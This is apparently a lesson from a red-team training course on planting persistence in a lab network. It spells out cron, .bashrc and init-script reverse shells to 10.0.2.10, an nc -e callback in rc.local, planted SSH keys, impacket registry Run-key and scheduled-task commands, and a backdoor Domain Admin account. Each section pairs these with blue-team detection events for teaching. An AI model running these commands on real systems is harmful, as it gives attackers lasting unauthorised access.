---
title: "Phase 5 — Persistence and C2 Infrastructure"
tags: [ghost-level, persistence, c2, living-off-the-land, scheduled-tasks,
  cron, module-11-ghost-level]
module: 11-GhostLevel
day: 721
prerequisites:
  - Day 720 — Phase 5: Evidence Collection
  - Day 528 — Persistence and C2 Beaconing
related_topics:
  - Day 722 — Phase 5: OPSEC and Log Review
---

# Day 721 — Phase 5: Persistence and C2 Infrastructure

> "Persistence is a two-edged sword. Every artefact you leave is evidence
> in the report — proof that your access was real and durable. But it is
> also a detection signature. In a real engagement, your persistence would
> live through a business weekend. In this lab, one mechanism per host,
> documented, ready to demonstrate and defend."
>
> — Ghost

---

> **ENGAGEMENT CLOCK — CHECK IN**
> Time elapsed: _______ hours | All five targets accessed: Y / N

---

## Goals

Deploy one persistence mechanism per compromised host. Document each mechanism
with the exact commands, timestamps, and detection method. This serves two
purposes: demonstrates durable access for the report, and teaches the blue
team what to look for. Both are required.

**Target time:** 2 hours total (30 min per host).

---

## 1 — Persistence on sable-web (Linux Web Server)

```bash
# ─── Method: Cron reverse shell ───────────────────────────────────────
# Least suspicious: uses existing cron infrastructure
# On sable-web as root:

# Confirm current cron state:
crontab -l 2>/dev/null
ls -la /etc/cron* 2>/dev/null

# Add reverse shell cron (every 5 minutes):
(crontab -l 2>/dev/null; \
    echo "*/5 * * * * bash -i >& /dev/tcp/10.0.2.10/4446 0>&1") \
    | crontab -

# Verify:
crontab -l

# ─── Alternative: SSH authorized_keys ────────────────────────────────
mkdir -p /root/.ssh
echo "<attacker_public_key>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
# Test: ssh -i <attacker_private_key> root@10.0.1.10
```

```
SABLE-WEB PERSISTENCE

Method deployed: cron / SSH key / systemd service / web shell / other
Command used:
  _______________________________________________________________
  _______________________________________________________________
Persistence file/entry location: ___________________________________
Survives: service restart / password reset / reboot
Tested (reconnected successfully): Y / N

BLUE TEAM DETECTION:
  What to look for: _____________________________________________
  Log source: /var/log/syslog / cron / auth.log
  Sigma rule keyword: ___________________________________________
```

---

## 2 — Persistence on sable-svc (Linux Binary Service)

```bash
# ─── Method: LD_PRELOAD backdoor in service init ──────────────────────
# On sable-svc as root or www-data:

# Check how sable_broker starts:
ps aux | grep sable
cat /etc/systemd/system/sable*.service 2>/dev/null
cat /etc/init.d/sable* 2>/dev/null

# Method A: if we have write to the service script
# Append a reverse shell after the main service starts:
echo 'bash -i >& /dev/tcp/10.0.2.10/4447 0>&1 &' \
    >> /etc/init.d/sable_broker 2>/dev/null

# Method B: .bashrc / .profile (if SSH access obtained)
echo 'bash -i >& /dev/tcp/10.0.2.10/4447 0>&1 &' >> /root/.bashrc

# Method C: Replace a library the binary loads (if writable)
ldd ./binaries/sable_broker 2>/dev/null
# If /usr/local/lib is writable: plant a trojanised libsable.so
```

```
SABLE-SVC PERSISTENCE

Method deployed: ___________________________________________________
Evidence: __________________________________________________________
Survives reboot: Y / N
Tested: Y / N

BLUE TEAM DETECTION:
  _______________________________________________________________
```

---

## 3 — Persistence on sable-dc (Windows Domain)

```bash
# ─── Method A: Golden Ticket (already done) ───────────────────────────
# The krbtgt hash does not change unless explicitly rotated twice.
# This is already our most powerful persistence mechanism.

# ─── Method B: Scheduled Task on DC ──────────────────────────────────
proxychains python3 /usr/share/doc/python3-impacket/examples/atexec.py \
    "SABLE.LOCAL/Administrator:<password>" \
    "powershell -nop -c \"cmd /c echo pwned > C:\\persist_test.txt\"" \
    -dc-ip 10.0.1.30

# For a real persistence task:
# schtasks /create /tn "UpdateCheck" /tr "cmd /c ..." /sc DAILY /st 06:00

# ─── Method C: Registry Run key (via reg.py) ─────────────────────────
proxychains python3 /usr/share/doc/python3-impacket/examples/reg.py \
    "SABLE.LOCAL/Administrator:<password>" \
    -dc-ip 10.0.1.30 \
    add \
    -keyName "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" \
    -v "UpdateService" \
    -vt REG_SZ \
    -vd "cmd /c powershell -nop -w hidden -c \"IEX(...)\"" 2>/dev/null

# ─── Method D: Domain Admin account backdoor ─────────────────────────
# (less stealthy — leave for report as theoretical demonstration)
# Add a secondary DA account:
proxychains python3 /usr/share/doc/python3-impacket/examples/net.py \
    "SABLE.LOCAL/Administrator:<password>" \
    -dc-ip 10.0.1.30 user add sable_backup 'P@ssw0rd123!' 2>/dev/null

proxychains python3 /usr/share/doc/python3-impacket/examples/net.py \
    "SABLE.LOCAL/Administrator:<password>" \
    -dc-ip 10.0.1.30 group add "Domain Admins" sable_backup 2>/dev/null
```

```
SABLE-DC PERSISTENCE

Primary: Golden Ticket (krbtgt hash)
  krbtgt NT hash: _______________________________
  Valid for: _______ years (survives all password resets except krbtgt x2)

Secondary mechanism: scheduled task / registry run / new DA account
  Method: ________________________________________________________
  Evidence: ______________________________________________________

BLUE TEAM DETECTION:
  Golden Ticket: Monitor for TGT lifetime > 10 hours (4769 events)
  Sched. Task: Event 4698 (Task Created), 4702 (Task Updated)
  Registry Run: Event 13 (Sysmon registry value set)
  New DA: Event 4728 (Member Added to Security Group)
```

---

## 4 — Persistence on sable-iot

```bash
# ─── On the sable-iot shell ───────────────────────────────────────────
# IoT devices often use cron or init.d

# Check init system:
ls /etc/init.d/ /etc/rc.d/ 2>/dev/null
cat /etc/inittab 2>/dev/null

# Cron (if available):
crontab -l 2>/dev/null || echo "no crontab binary"

# /etc/rc.local equivalent:
cat /etc/rc.local 2>/dev/null

# Add to startup:
echo 'nc 10.0.2.10 4448 -e /bin/sh &' >> /etc/rc.local 2>/dev/null

# Alternative: if SSH key can be planted:
mkdir -p /etc/dropbear  # Dropbear SSH (common on embedded Linux)
echo "<attacker_public_key>" >> /etc/dropbear/authorized_keys
```

```
SABLE-IOT PERSISTENCE

Method deployed: ___________________________________________________
Init system: BusyBox init / systemd / SysV
Evidence: __________________________________________________________
Survives reboot: Y / N

BLUE TEAM DETECTION:
  Limited logging on embedded Linux.
  Detection requires: firmware integrity check / process monitoring
  Indicator: unexpected outbound TCP to 10.0.2.10:4448
```

---

## 5 — Persistence Documentation for Report

```
PERSISTENCE SUMMARY TABLE

Host        | Method                    | Technique          | ATT&CK TTP
------------|---------------------------|--------------------|-----------
sable-web   | Cron job / SSH key        | Scheduled Task     | T1053.003
sable-svc   | Init script modification  | Boot/Logon Autorun | T1037.004
sable-dc    | Golden Ticket + krbtgt    | Forge Kerberos TGT | T1558.001
sable-dc    | Secondary DA account      | Create Account     | T1136.002
sable-iot   | /etc/rc.local entry       | Boot/Logon Autorun | T1037.004
sable-store | [via DA share write]      | [if applicable]    | -

Overall persistence resilience:
  Survives user password reset:     Y (Golden Ticket, SSH keys, cron)
  Survives service restart:         Y (cron, init script)
  Survives domain krbtgt rotation × 1: Y (Golden Ticket still valid)
  Survives domain krbtgt rotation × 2: N (Golden Ticket invalidated)
  Elimination requires: KRBTGT reset twice + full IR sweep
```

---

## Navigation

← Previous: [Day 720 — Phase 5: Evidence Collection](DAY-0720-Phase5-Exfiltration-Evidence.md)
→ Next: [Day 722 — Phase 5: OPSEC and Log Review](DAY-0722-Phase5-OPSEC-Log-Review.md)
